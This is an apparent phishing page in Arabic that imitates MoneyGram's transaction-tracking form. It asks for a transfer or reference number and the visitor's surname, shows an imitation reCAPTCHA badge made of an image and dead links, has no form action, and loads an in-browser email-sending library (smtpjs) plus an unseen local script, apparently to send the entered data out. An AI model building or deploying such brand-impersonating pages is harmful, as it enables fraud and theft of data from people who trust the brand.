<!doctype html>
<html lang="en">

<head>
  <title>MoneyGram</title>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <link rel="shortcut icon" type="image/x-icon" href="./images/favicon.png"/>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.0/font/bootstrap-icons.css" />
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css" />
  <link rel="stylesheet" href="./css/bootstrap.min.css" />
  <link rel="stylesheet" href="./css/style.css" />
  <link rel="stylesheet" href="./css/media.css" />

</head>

<body>

  <div class="head">
    <div class="container h-100 d-flex">
      <div class="logo">
        <img src="./images/logo.png" alt="logo">
      </div>
    </div>
  </div>


  <section class="main">
    <div class="section2 d-flex align-items-center">
      <div class="container">
        <h4 class="fw-bold m-0"> تعقّب عملية</h4>
      </div>
    </div>

    <div class="section3 mb-5">
      <div class="container d-flex flex-wrap">
        <div class="box1 col-12 col-md-5">
          <h5 class="fw-bold">إبحث عن تحويل أو دفع: </h5>
          <p class="m-0">إبحث عن وضعية أي عملية عبر إدخال رقم التخويل أو الرقم المرجعي وشهرتك. </p>
        </div>

        <form 
        id="form"
        class="box2 col-12 col-md-7"
        >
          <div class="content">
            <div class="field">
              <label class="field__label" for="form-one">رقم التخويل أو الرقم المرجعي</label>
              <input name="in1" class="field__input" type="text" required placeholder="رقم التخويل أو الرقم المرجعي" id="form-one"
                onfocus="onfocusFun(this)" onblur="onblurFun(this)">
            </div>
          </div>
          <div class="content">
            <div class="field">
              <label class="field__label" for="form-two">شهرتك</label>
              <input name="in2" class="field__input" type="text" required placeholder="شهرتك" id="form-two"
                onfocus="onfocusFun(this)" onblur="onblurFun(this)">
            </div>
          </div>
      </div>
    </div>

    <div class="container d-flex justify-content-end">
      <div class="col-12 col-md-4">
        <button type="submit"
         class="btn btn-primary w-100">تعقّب</button>
        <div class="d-flex justify-content-center align-items-center my-3">
          <div class="icon">
            <img src="./images/recaptcha.png" alt="icon">
          </div>
          <a href="#" class="link mx-2">reCAPTCHA</a>
        </div>
      </form>
        <div id="response"></div>
        <div class="text text-center">
          <p class="m-0 text-center">مدعوم من جوجل</p>
          <a href="#">سياسة الخصوصية</a>
          -
          <a href="#">الشروط</a>
        </div>
      </div>

    </div>

  </section>

  <footer class="d-flex align-items-center">
    <div class="container d-flex flex-column-reverse flex-md-row">
      <p class="m-0 col-12 col-md-4 d-flex justify-content-center justify-content-md-start">© 2022 MoneyGram.</p>
      <div class="f-link col-12 col-md-8 d-flex justify-content-center justify-content-md-start mb-2 mb-md-0">
        <a href="#">بيان الخصوصية</a>
        <a href="#">تعليمات الاستخدام</a>
        <a href="#">سياسة ملفات تعريف الإرتباط</a>
      </div>
    </div>
  </footer>

  <script src="./js/bootstrap.min.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.js" integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk="
    crossorigin="anonymous"></script>
    <script src="https://smtpjs.com/v3/smtp.js"></script>
  <script src="./js/index.js"></script>
  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
</body>

</html>
